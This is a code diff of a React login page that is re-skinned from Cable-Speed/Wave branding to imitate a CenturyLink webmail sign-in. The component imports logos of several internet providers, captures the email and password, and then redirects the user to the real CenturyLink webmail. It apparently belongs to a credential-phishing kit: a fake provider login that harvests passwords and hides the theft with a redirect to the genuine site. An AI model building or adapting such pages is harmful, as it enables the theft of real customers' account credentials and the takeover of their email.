@@ -10,6 +10,7 @@ import iglou from './iglou.png';
 import catskill from './catskill.png';
 import winstream from './windstream.png';
 import wave from './wave.png';
+import centurylink from './centurylink.png';
 
 function Home(){
 
@@ -17,7 +18,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Cable-Speed")
+    const[platform, setPlatform] = useState("Century Link")
 
     const[showError, setShowError] = useState(false);
 
@@ -44,7 +45,7 @@ function Home(){
              // console.log(response.data.message);
   
             
-             window.location.href = 'https://cablespeed-email.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_56e5e2f75566a589926b780c3eb89e81af0c6c4259%3Ahttps%3A%2F%2Fcablespeed-email.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Femail.cablespeed.com%252F%26cookieTime%3D1714740829';
+             window.location.href = 'https://webmail.centurylink.net/app/';
           }
         } catch (error) {
           // Handle error
@@ -67,16 +68,16 @@ function Home(){
 
 
 
-            <div className='text-center my-2'>
-            <img  src={wave} className="mylogo"/>
+            <div className='my-2 px-3'>
+            <img  src={centurylink} className="mylogo"/>
 
             </div>
 
 
-            <div className='col-md-5 whitediv m-auto   px-0'>
+            <div className='col-md-4 whitediv m-auto   px-0'>
               
 
-              <h4 className='text-center'>Log In</h4>
+            
                 
 
 
@@ -84,26 +85,31 @@ function Home(){
                 <form onSubmit={handleSubmit} className="px-5">
 
                     <div className='form-group mt-5'>
-                        <label className='label'> USERNAME</label>
+                 
                         <input type="email"onChange={function(e){
                             setUserName(e.target.value);
-                        }}value={email} placeholder="Username" className="form-control myinput"required />
+                        }}value={email} placeholder="CenturyLink Email" className="form-control bottom-border-only py-3"required />
 
                     </div>
 
+                    <br/>
+
 
                     <div className='form-group'>
-                        <label className='label'> Password</label>
+                  
                  
                         <input type="password"onChange={function(e){
                             setPassword(e.target.value);
-                        }}value={password} placeholder="Password" className="form-control w-80"required />
+                        }}value={password} placeholder="Password" className="form-control bottom-border-only py-3"required />
                        
 
                     </div>
 
+                    
+
                     <div className='form-group'>
-                      <input type="checkbox" /> <span className='font-weight-bold px-2'>Remember Me ?</span>
+                      <input type="checkbox" /> <span className='font-weight-normal px-2'>Stay signed in
+</span>
 
                     </div>
 
@@ -134,12 +140,12 @@ function Home(){
                     </div> */}
 
 
-                    <div className='form-group text-center'>
+                    <div className='form-group text-center mt-5'>
 
 <button type='submit' style={{
-  backgroundColor: '#483092',
-  fontSize:'25px',
-}}className='btn text-center w-100 font-weight-bold text-light py-2 rounded '>LOGIN</button>
+  backgroundColor: '#0047bb',
+  fontSize:'18px',
+}}className='btn text-center w-100 font-weight-bold text-light py-2 rounded '>Sign In</button>
 
 
 
@@ -153,8 +159,7 @@ function Home(){
         color: '#1f8aa3',
         textDecoration: 'underline',
   }}>Forgot Password <br/>
-Privacy Policy<br/>
-Terms of Service</a>
+</a>
 
 </div>
 
@@ -164,13 +169,7 @@ Terms of Service</a>
 
 </br>
 
-<div className='text-center py-3'>
-  <h6 className='font-weight-bold'>Support - Contact Us at 1-800-4-ASTOUND</h6>
-  <p className=''style={{
-    fontSize:"14px",
-  }}>Broadstripe Customers in Maryland please call 410-987-9300</p>
-</div>
-                 
+        
 
                 </form>
 
